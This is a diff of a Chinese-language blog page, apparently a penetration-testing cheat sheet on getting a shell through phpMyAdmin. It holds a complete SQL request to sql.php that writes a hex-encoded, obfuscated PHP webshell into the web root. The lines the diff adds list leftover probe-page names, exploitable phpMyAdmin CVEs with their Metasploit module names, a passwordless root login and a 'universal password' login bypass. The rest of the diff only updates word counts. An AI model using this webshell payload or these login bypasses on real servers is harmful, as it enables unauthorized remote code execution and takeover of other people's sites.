@@ -427,14 +427,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        2.8k
+                        3k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        12 分
+                        13 分
                     </div>
                     
                 
@@ -463,10 +463,12 @@
 <p>常见未删除探针页面</p>
 <ul>
 <li>l.php</li>
+<li>iProber2.php</li>
 <li>p.php</li>
 <li>tanzhen.php</li>
 <li>tz.php</li>
 <li>u.php</li>
+<li>xprober.php</li>
 </ul>
 <p>常见未删除测试文件</p>
 <ul>
@@ -641,7 +643,28 @@ set global general_log=&#39;off&#39;;              //关闭general_log模式</co
 <li>参数pos=0</li>
 </ul>
 <pre><code>&amp;sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><p>例如</p>
-<pre><code>http://127.0.0.1/phpmyadmin/sql.php?db=数据库名&amp;token=token值&amp;table=数据表名&amp;pos=0&amp;sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><h1 id="0x03-CMS-GetShell"><a href="#0x03-CMS-GetShell" class="headerlink" title="0x03 CMS GetShell"></a>0x03 CMS GetShell</h1><h2 id="WordPress-1"><a href="#WordPress-1" class="headerlink" title="WordPress"></a>WordPress</h2><p><a href="https://dylan903.coding.me/2019/11/06/wordpress-hou-tai-getshell-zong-jie/">Wordpress 后台GetShell总结</a></p>
+<pre><code>http://127.0.0.1/phpmyadmin/sql.php?db=数据库名&amp;token=token值&amp;table=数据表名&amp;pos=0&amp;sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><h2 id="特殊版本GetShell"><a href="#特殊版本GetShell" class="headerlink" title="特殊版本GetShell"></a>特殊版本GetShell</h2><p><strong>CVE-2013-3238</strong></p>
+<blockquote>
+<p>影响版本：3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3 ANYUN.ORG</p>
+<p>利用模块：exploit/multi/http/phpmyadminpregreplace</p>
+</blockquote>
+<p><strong>CVE-2012-5159</strong></p>
+<blockquote>
+<p>影响版本：phpMyAdmin v3.5.2.2</p>
+<p>利用模块：exploit/multi/http/phpmyadmin3522_backdoor</p>
+</blockquote>
+<p><strong>CVE-2009-1151</strong></p>
+<blockquote>
+<p>PhpMyAdmin配置文件/config/config.inc.php存在命令执行</p>
+<p>影响版本：2.11.x &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1</p>
+<p>利用模块：exploit/unix/webapp/phpmyadmin_config</p>
+</blockquote>
+<p><strong>弱口令&amp;万能密码</strong></p>
+<blockquote>
+<p>弱口令：版本phpmyadmin2.11.9.2， 直接root用户登陆，无需密码</p>
+<p>万能密码：版本2.11.3 / 2.11.4，用户名‘localhost’@‘@”则登录成功</p>
+</blockquote>
+<h1 id="0x03-CMS-GetShell"><a href="#0x03-CMS-GetShell" class="headerlink" title="0x03 CMS GetShell"></a>0x03 CMS GetShell</h1><h2 id="WordPress-1"><a href="#WordPress-1" class="headerlink" title="WordPress"></a>WordPress</h2><p><a href="https://dylan903.coding.me/2019/11/06/wordpress-hou-tai-getshell-zong-jie/">Wordpress 后台GetShell总结</a></p>
 <h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://bbs.ichunqiu.com/thread-19893-1-1.html" target="_blank" rel="noopener">PhpMyAdmin 网站路径信息获取</a><br><a href="https://blog.csdn.net/q1352483315/article/details/88904001" target="_blank" rel="noopener">总结下写phpmyadmin写shell的方法</a><br><a href="https://xz.aliyun.com/t/3283" target="_blank" rel="noopener">phpmyadmin getshell姿势 - 先知社区</a></p>
 
             </div>
@@ -1371,7 +1394,7 @@ set global general_log=&#39;off&#39;;              //关闭general_log模式</co
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">45.2k</span>
+                <span class="white-color">45.6k</span>
             
 
             
